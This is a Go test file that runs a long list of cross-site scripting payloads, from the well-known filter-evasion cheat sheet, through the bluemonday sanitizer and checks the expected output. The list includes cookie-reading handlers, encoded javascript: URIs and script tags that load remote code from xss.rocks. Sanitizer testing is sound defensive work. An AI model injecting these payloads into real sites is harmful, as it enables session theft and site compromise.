package rest

import (
	"testing"

	"github.com/microcosm-cc/bluemonday"
	"github.com/stretchr/testify/assert"
)

type xss struct {
	Name           string
	Value          string
	ExpectedUGC    string
	ExpectedStrict string
}

var vulnerabilities = []xss{
	{
		Name: `XSS Locator`,
		Value: `';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`,
		ExpectedUGC: `&#39;;alert(String.fromCharCode(88,83,83))//&#39;;alert(String.fromCharCode(88,83,83))//&#34;;
alert(String.fromCharCode(88,83,83))//&#34;;alert(String.fromCharCode(88,83,83))//--
&gt;&#34;&gt;&#39;&gt;`,
		ExpectedStrict: `&#39;;alert(String.fromCharCode(88,83,83))//&#39;;alert(String.fromCharCode(88,83,83))//&#34;;
alert(String.fromCharCode(88,83,83))//&#34;;alert(String.fromCharCode(88,83,83))//--
&gt;&#34;&gt;&#39;&gt;`,
	}, {
		Name:           `XSS Locator (short)`,
		Value:          `'';!--"<XSS>=&{()}`,
		ExpectedUGC:    `&#39;&#39;;!--&#34;=&amp;{()}`,
		ExpectedStrict: `&#39;&#39;;!--&#34;=&amp;{()}`,
	}, {
		Name:           `No Filter Evasion`,
		Value:          `<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name: `Filter bypass based polyglot`,
		Value: `'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script>
<script>alert(document.cookie)</script>">
<img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'">
<img src="http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">`,
		ExpectedUGC: `&#39;&#34;&gt;&gt;<img src="x">&#34;&gt;
&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;&#39;--&gt;&#34;&gt;&lt;/script&gt;
&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#34;&gt;
&lt;img/id=&#34;confirm&amp;lpar;1)&#34;/alt=&#34;/&#34;src=&#34;/&#34;onerror=eval(id)&gt;&#39;&#34;&gt;
&lt;img src=&#34;http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg&#34;&gt;`,
		ExpectedStrict: `&#39;&#34;&gt;&gt;&#34;&gt;
&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;&#39;--&gt;&#34;&gt;&lt;/script&gt;
&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#34;&gt;
&lt;img/id=&#34;confirm&amp;lpar;1)&#34;/alt=&#34;/&#34;src=&#34;/&#34;onerror=eval(id)&gt;&#39;&#34;&gt;
&lt;img src=&#34;http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg&#34;&gt;`,
	}, {
		Name:           `Image XSS using the JavaScript directive`,
		Value:          `<IMG SRC="javascript:alert('XSS');">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `No quotes and no semicolon`,
		Value:          `<IMG SRC=javascript:alert('XSS')>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Case insensitive XSS attack vector`,
		Value:          `<IMG SRC=JaVaScRiPt:alert('XSS')>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `HTML entities`,
		Value:          `<IMG SRC=javascript:alert("XSS")>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Grave accent obfuscation`,
		Value:          "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name: `Malformed A tags`,
		Value: `<a onmouseover="alert(document.cookie)">xxs link</a>
		<a onmouseover=alert(document.cookie)>xxs link</a>`,
		ExpectedUGC: "xxs link\n\t\txxs link",
		ExpectedStrict: `xxs link
		xxs link`,
	}, {
		Name:           `Malformed IMG tags`,
		Value:          `<IMG """><SCRIPT>alert("XSS")</SCRIPT>">`,
		ExpectedUGC:    `&#34;&gt;`,
		ExpectedStrict: `&#34;&gt;`,
	}, {
		Name:           `fromCharCode`,
		Value:          `<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Default SRC tag to get past filters that check SRC domain`,
		Value:          `<IMG SRC=# onmouseover="alert('xxs')">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Default SRC tag by leaving it empty`,
		Value:          `<IMG SRC= onmouseover="alert('xxs')">`,
		ExpectedUGC:    `<img src="onmouseover=%22alert%28%27xxs%27%29%22">`,
		ExpectedStrict: ``,
	}, {
		Name:           `Default SRC tag by leaving it out entirely`,
		Value:          `<IMG onmouseover="alert('xxs')">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `On error alert`,
		Value:          `<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`,
		ExpectedUGC:    `<img src="/"></img>`,
		ExpectedStrict: ``,
	}, {
		Name:           `IMG onerror and javascript alert encode`,
		Value:          `<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">`,
		ExpectedUGC:    `<img src="x">`,
		ExpectedStrict: ``,
	}, {
		Name: `Decimal HTML character references`,
		Value: `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
	&#39;&#88;&#83;&#83;&#39;&#41;>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name: `Decimal HTML character references without trailing semicolons`,
		Value: `<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
	#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Hexadecimal HTML character references without trailing semicolons`,
		Value:          `<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name: `Embedded tab`,
		Value: `<IMG SRC="jav	ascript:alert('XSS');">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Embedded Encoded tab`,
		Value:          `<IMG SRC="jav&#x09;ascript:alert('XSS');">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Embedded newline to break up XSS`,
		Value:          `<IMG SRC="jav&#x0A;ascript:alert('XSS');">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Embedded carriage return to break up XSS`,
		Value:          `<IMG SRC="jav&#x0D;ascript:alert('XSS');">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Null breaks up JavaScript directive`,
		Value:          `<IMG SRC=java\0script:alert(\"XSS\")>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Spaces and meta chars before the JavaScript in images for XSS`,
		Value:          `<IMG SRC=" &#14;  javascript:alert('XSS');">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name: `Non-alpha-non-digit XSS`,
		Value: `<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>` +
			`<BODY onload!#$%&()*~+-_.,:;?@[/|\]^` + "`=alert(\"XSS\")>" +
			`<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Extraneous open brackets`,
		Value:          `<<SCRIPT>alert("XSS");//<</SCRIPT>`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `No closing script tags`,
		Value:          `<SCRIPT SRC=http://xss.rocks/xss.js?< B >`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Protocol resolution in script tags`,
		Value:          `<SCRIPT SRC=//xss.rocks/.j>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Half open HTML/JavaScript XSS vector`,
		Value:          `<IMG SRC="javascript:alert('XSS')"`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Double open angle brackets`,
		Value:          `<iframe src=http://xss.rocks/scriptlet.html <`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Escaping JavaScript escapes`,
		Value:          `\";alert('XSS');//` + `</script><script>alert('XSS');</script>`,
		ExpectedUGC:    `\&#34;;alert(&#39;XSS&#39;);//`,
		ExpectedStrict: `\&#34;;alert(&#39;XSS&#39;);//`,
	}, {
		Name:           `End title tag`,
		Value:          `</TITLE><SCRIPT>alert("XSS");</SCRIPT>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `INPUT image`,
		Value:          `<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `BODY image`,
		Value:          `<BODY BACKGROUND="javascript:alert('XSS')">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `IMG Dynsrc`,
		Value:          `<IMG DYNSRC="javascript:alert('XSS')">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `IMG lowsrc`,
		Value:          `<IMG LOWSRC="javascript:alert('XSS')">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `List-style-image`,
		Value:          `<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`,
		ExpectedUGC:    `<ul><li>XSS</br>`,
		ExpectedStrict: `XSS`,
	}, {
		Name:           `VBscript in an image`,
		Value:          `<IMG SRC='vbscript:msgbox("XSS")'>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Livescript (older versions of Netscape only)`,
		Value:          `<IMG SRC="livescript:[code]">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `SVG object tag`,
		Value:          `<svg/onload=alert('XSS')>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `ECMAScript 6`,
		Value:          "Set.constructor`alert\x28document.domain\x29```",
		ExpectedUGC:    "Set.constructor`alert(document.domain)```",
		ExpectedStrict: "Set.constructor`alert(document.domain)```",
	}, {
		Name:           `BODY tag`,
		Value:          `<BODY ONLOAD=alert('XSS')>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `BGSOUND`,
		Value:          `<BGSOUND SRC="javascript:alert('XSS');">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `& JavaScript includes`,
		Value:          `<BR SIZE="&{alert('XSS')}">`,
		ExpectedUGC:    `<br>`,
		ExpectedStrict: ``,
	}, {
		Name:           `STYLE sheet`,
		Value:          `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Remote style sheet`,
		Value:          `<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Remote style sheet part 2`,
		Value:          `<STYLE>@import'http://xss.rocks/xss.css';</STYLE>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Remote style sheet part 3`,
		Value:          `<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Remote style sheet part 4`,
		Value:          `<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `STYLE tags with broken up JavaScript for XSS`,
		Value:          `<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `STYLE attribute using a comment to break up expression`,
		Value:          `<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name: `IMG STYLE with expression`,
		Value: `exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>`,
		ExpectedUGC:    `exp/*`,
		ExpectedStrict: `exp/*`,
	}, {
		Name:           `STYLE tag (Older versions of Netscape only)`,
		Value:          `<STYLE TYPE="text/javascript">alert('XSS');</STYLE>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `STYLE tag using background-image`,
		Value:          `<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `STYLE tag using background`,
		Value:          `<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Anonymous HTML with STYLE attribute`,
		Value:          `<XSS STYLE="xss:expression(alert('XSS'))">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `Local htc file`,
		Value:          `<XSS STYLE="behavior: url(xss.htc);">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `US-ASCII encoding`,
		Value:          `¼script¾alert(¢XSS¢)¼/script¾`,
		ExpectedUGC:    `¼script¾alert(¢XSS¢)¼/script¾`,
		ExpectedStrict: `¼script¾alert(¢XSS¢)¼/script¾`,
	}, {
		Name:           `META`,
		Value:          `<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `META using data`,
		Value:          `<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `META with additional URL parameter`,
		Value:          `<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `IFRAME`,
		Value:          `<IFRAME SRC="javascript:alert('XSS');"></IFRAME>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `IFRAME Event based`,
		Value:          `<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `FRAME`,
		Value:          `<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `TABLE`,
		Value:          `<TABLE BACKGROUND="javascript:alert('XSS')">`,
		ExpectedUGC:    `<table>`,
		ExpectedStrict: ``,
	}, {
		Name:           `TD`,
		Value:          `<TABLE><TD BACKGROUND="javascript:alert('XSS')">`,
		ExpectedUGC:    `<table><td>`,
		ExpectedStrict: ``,
	}, {
		Name:           `DIV background-image`,
		Value:          `<DIV STYLE="background-image: url(javascript:alert('XSS'))">`,
		ExpectedUGC:    `<div>`,
		ExpectedStrict: ``,
	}, {
		Name:           `DIV background-image with unicoded XSS exploit`,
		Value:          `<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">`,
		ExpectedUGC:    `<div>`,
		ExpectedStrict: ``,
	}, {
		Name:           `DIV background-image plus extra characters`,
		Value:          `<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">`,
		ExpectedUGC:    `<div>`,
		ExpectedStrict: ``,
	}, {
		Name:           `DIV expression`,
		Value:          `<DIV STYLE="width: expression(alert('XSS'));">`,
		ExpectedUGC:    `<div>`,
		ExpectedStrict: ``,
	}, {
		Name: `Downlevel-Hidden block`,
		Value: `<!--[if gte IE 4]>
 <SCRIPT>alert('XSS');</SCRIPT>
 <![endif]-->`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `BASE tag`,
		Value:          `<BASE HREF="javascript:alert('XSS');//">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `OBJECT tag`,
		Value:          `<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name: `Using an EMBED tag you can embed a Flash movie that contains XSS`,
		Value: `EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:
org/xss.swf" AllowScriptAccess="always"></EMBED>`,
		ExpectedUGC: `EMBED SRC=&#34;http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess=&#34;never&#34; and allownetworking=&#34;internal&#34; it can mitigate this risk (thank you to Jonathan Vanasco for the info).:
org/xss.swf&#34; AllowScriptAccess=&#34;always&#34;&gt;`,
		ExpectedStrict: `EMBED SRC=&#34;http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess=&#34;never&#34; and allownetworking=&#34;internal&#34; it can mitigate this risk (thank you to Jonathan Vanasco for the info).:
org/xss.swf&#34; AllowScriptAccess=&#34;always&#34;&gt;`,
	}, {
		Name:           `You can EMBED SVG which can contain your XSS vector`,
		Value:          `<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name: `Using ActionScript inside flash can obfuscate your XSS vector`,
		Value: `a="get";
b="URL(\"";
c="javascript:";
d="alert('XSS');\")";
eval(a+b+c+d);`,
		ExpectedUGC: `a=&#34;get&#34;;
b=&#34;URL(\&#34;&#34;;
c=&#34;javascript:&#34;;
d=&#34;alert(&#39;XSS&#39;);\&#34;)&#34;;
eval(a+b+c+d);`,
		ExpectedStrict: `a=&#34;get&#34;;
b=&#34;URL(\&#34;&#34;;
c=&#34;javascript:&#34;;
d=&#34;alert(&#39;XSS&#39;);\&#34;)&#34;;
eval(a+b+c+d);`,
	}, {
		Name: `XML data island with CDATA obfuscation`,
		Value: `<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>`,
		ExpectedUGC: `<i><b></b></i>
<span></span>`,
		ExpectedStrict: `
`,
	}, {
		Name: `Locally hosted XML with embedded JavaScript that is generated using an XML data island`,
		Value: `<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>`,
		ExpectedUGC: `
<span></span>`,
		ExpectedStrict: `
`,
	}, {
		Name: `HTML+TIME in XML`,
		Value: `<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
</BODY></HTML>`,
		ExpectedUGC: `


&#34;&gt;
`,
		ExpectedStrict: `


&#34;&gt;
`,
	}, {
		Name:           `Assuming you can only fit in a few characters and it filters against ".js"`,
		Value:          `<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `SSI (Server Side Includes)`,
		Value:          `<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name: `PHP`,
		Value: `<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>`,
		ExpectedUGC:    `alert(&#34;XSS&#34;)&#39;); ?&gt;`,
		ExpectedStrict: `alert(&#34;XSS&#34;)&#39;); ?&gt;`,
	}, {
		Name:           `IMG Embedded commands`,
		Value:          `<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">`,
		ExpectedUGC:    `<img src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">`,
		ExpectedStrict: ``,
	}, {
		Name:           `IMG Embedded commands part II`,
		Value:          `Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser`,
		ExpectedUGC:    `Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser`,
		ExpectedStrict: `Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser`,
	}, {
		Name:           `Cookie manipulation`,
		Value:          `<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">`,
		ExpectedUGC:    ``,
		ExpectedStrict: ``,
	}, {
		Name:           `UTF-7 encoding`,
		Value:          `<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-`,
		ExpectedUGC:    ` +ADw-SCRIPT+AD4-alert(&#39;XSS&#39;);+ADw-/SCRIPT+AD4-`,
		ExpectedStrict: ` +ADw-SCRIPT+AD4-alert(&#39;XSS&#39;);+ADw-/SCRIPT+AD4-`,
	}, {
		Name: `XSS using HTML quote encapsulation`,
		Value: `<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>` +
			`<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>` +
			`<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>` +
			`<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>` +
			"<SCRIPT a=`>` SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>" +
			`<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>` +
			`<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
		ExpectedUGC:    `PT SRC=&#34;httx://xss.rocks/xss.js&#34;&gt;`,
		ExpectedStrict: `PT SRC=&#34;httx://xss.rocks/xss.js&#34;&gt;`,
	}, {
		Name:           `IP verses hostname`,
		Value:          `<A HREF="http://66.102.7.147/">XSS</A>`,
		ExpectedUGC:    `<a href="http://66.102.7.147/" rel="nofollow">XSS</a>`,
		ExpectedStrict: `XSS`,
	}, {
		Name:           `URL encoding`,
		Value:          `<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>`,
		ExpectedUGC:    `XSS`,
		ExpectedStrict: `XSS`,
	}, {
		Name:           `Dword encoding`,
		Value:          `<A HREF="http://1113982867/">XSS</A>`,
		ExpectedUGC:    `<a href="http://1113982867/" rel="nofollow">XSS</a>`,
		ExpectedStrict: `XSS`,
	}, {
		Name:           `Hex encoding`,
		Value:          `<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>`,
		ExpectedUGC:    `<a href="http://0x42.0x0000066.0x7.0x93/" rel="nofollow">XSS</a>`,
		ExpectedStrict: `XSS`,
	}, {
		Name:           `Octal encoding`,
		Value:          `<A HREF="http://0102.0146.0007.00000223/">XSS</A>`,
		ExpectedUGC:    `<a href="http://0102.0146.0007.00000223/" rel="nofollow">XSS</a>`,
		ExpectedStrict: `XSS`,
	}, {
		Name: `Mixed encoding`,
		Value: `<A HREF="h
tt	p://6	6.000146.0x7.147/">XSS</A>`,
		ExpectedUGC:    `XSS`,
		ExpectedStrict: `XSS`,
	}, {
		Name:           `Protocol resolution bypass`,
		Value:          `<A HREF="//www.google.com/">XSS</A>`,
		ExpectedUGC:    `<a href="//www.google.com/" rel="nofollow">XSS</a>`,
		ExpectedStrict: `XSS`,
	}, {
		Name:           `Google "feeling lucky" part 1.`,
		Value:          `<A HREF="//google">XSS</A>`,
		ExpectedUGC:    `<a href="//google" rel="nofollow">XSS</a>`,
		ExpectedStrict: `XSS`,
	}, {
		Name:           `Google "feeling lucky" part 2.`,
		Value:          `<A HREF="http://ha.ckers.org@google">XSS</A>`,
		ExpectedUGC:    `<a href="http://ha.ckers.org@google" rel="nofollow">XSS</a>`,
		ExpectedStrict: `XSS`,
	}, {
		Name:           `Google "feeling lucky" part 3.`,
		Value:          `<A HREF="http://google:ha.ckers.org">XSS</A>`,
	//	ExpectedUGC:    `<a href="http://google:ha.ckers.org" rel="nofollow">XSS</a>`,
		ExpectedUGC:    `XSS`,
		ExpectedStrict: `XSS`,
	}, {
		Name:           `Removing cnames`,
		Value:          `<A HREF="http://google.com/">XSS</A>`,
		ExpectedUGC:    `<a href="http://google.com/" rel="nofollow">XSS</a>`,
		ExpectedStrict: `XSS`,
	}, {
		Name:           `Extra dot for absolute DNS:`,
		Value:          `<A HREF="http://www.google.com./">XSS</A>`,
		ExpectedUGC:    `<a href="http://www.google.com./" rel="nofollow">XSS</a>`,
		ExpectedStrict: `XSS`,
	}, {
		Name:           `JavaScript link location:`,
		Value:          `<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>`,
		ExpectedUGC:    `XSS`,
		ExpectedStrict: `XSS`,
	}, {
		Name:           `Content replace as attack vector`,
		Value:          `<A HREF="http://www.google.com/ogle.com/">XSS</A>`,
		ExpectedUGC:    `<a href="http://www.google.com/ogle.com/" rel="nofollow">XSS</a>`,
		ExpectedStrict: `XSS`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `\0`,
		ExpectedUGC:    "\\0",
		ExpectedStrict: "\\0",
	}, {
		Name:           `Character escape sequences`,
		Value:          `<`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `%3C`,
		ExpectedUGC:    `%3C`,
		ExpectedStrict: `%3C`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&lt`,
		ExpectedUGC:    "&lt;",
		ExpectedStrict: "&lt;",
	}, {
		Name:           `Character escape sequences`,
		Value:          `&lt;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&LT`,
		ExpectedUGC:    "&lt;",
		ExpectedStrict: "&lt;",
	}, {
		Name:           `Character escape sequences`,
		Value:          `&LT;`,
		ExpectedUGC:    "&lt;",
		ExpectedStrict: "&lt;",
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#60`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#060`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#0060`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#00060`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#000060`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#0000060`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#60;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#060;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#0060;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#00060;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#000060;`,
		ExpectedUGC:    `&lt;`,
